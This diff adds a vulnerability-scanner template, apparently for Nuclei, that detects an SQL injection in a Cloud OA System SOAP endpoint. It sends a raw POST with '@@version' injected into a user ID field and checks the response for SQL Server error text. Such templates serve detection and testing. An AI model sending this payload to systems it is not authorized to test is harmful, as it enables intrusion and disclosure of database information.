@@ -1,0 +1,38 @@
+id: cloud-oa-sqli
+info:
+  name: Cloud OA System SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Cloud OA System /OA/PM/svc.asmx page parameters are not properly filtered, resulting in a SQL injection vulnerability, which can be used to obtain sensitive information in the database.
+  tags: sqli
+  reference:
+    - https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=3860
+http:
+  - raw:
+      - |
+        POST /OA/PM/svc.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetUsersInfo xmlns="http://tempuri.org/">
+              <userIdList>@@version</userIdList>
+            </GetUsersInfo>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "Microsoft SQL Server"
+        part: body
+      - type: word
+        words:
+          - "转换成数据类型 int 时失败"
+        part: body
